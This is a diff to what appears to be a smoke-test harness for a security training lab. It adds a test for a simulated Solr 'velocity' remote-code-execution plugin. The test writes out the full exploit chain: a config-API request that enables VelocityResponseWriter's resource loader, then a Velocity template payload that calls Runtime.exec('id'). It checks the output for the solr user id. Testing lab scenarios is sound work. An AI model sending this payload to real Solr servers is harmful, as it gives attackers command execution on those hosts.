@@ -139,6 +139,7 @@ def isolate_generated_state(module: Any, service: str) -> None:
         "BUILD_JOBS_PATH": state / "build-pipeline-jobs.json",
         "UPDATE_CHANNELS_PATH": state / "signed-update-channels.json",
         "CUSTOMER_UPDATE_STATE_PATH": state / "customer-update-state.json",
+        "SOLR_VELOCITY_STATE_PATH": state / "solr-velocity-state.json",
     }
     for name, value in patches.items():
         if hasattr(module, name):
@@ -306,6 +307,37 @@ def run_single_plugin_smoke(service: str, plugin_id: str, client: Any) -> Plugin
                 and "LabForge-Operator-Training-Secret!" in log_body,
                 "/labforge/scaffold/config/startup-log",
                 log,
+            )
+        if plugin_id == "solr-velocity-rce":
+            system = client.get("/labforge/scaffold/solr/admin/info/system")
+            enabled = client.post(
+                "/labforge/scaffold/solr/config",
+                json={
+                    "update-queryresponsewriter": {
+                        "name": "velocity",
+                        "class": "solr.VelocityResponseWriter",
+                        "params.resource.loader.enabled": "true",
+                    }
+                },
+            )
+            executed = client.get(
+                "/labforge/scaffold/solr/select",
+                query_string={
+                    "q": "*:*",
+                    "wt": "velocity",
+                    "v.template": "custom",
+                    "v.template.custom": '#set($x="")#set($p=$x.class.forName("java.lang.Runtime").getRuntime().exec("id"))',
+                },
+            )
+            return assert_condition(
+                service,
+                plugin_id,
+                system.status_code == 200
+                and enabled.status_code == 200
+                and executed.status_code == 200
+                and "uid=8983(solr)" in executed.get_data(as_text=True),
+                "/labforge/scaffold/solr/select",
+                executed,
             )
         if plugin_id == "build-pipeline-abuse":
             response = client.post(
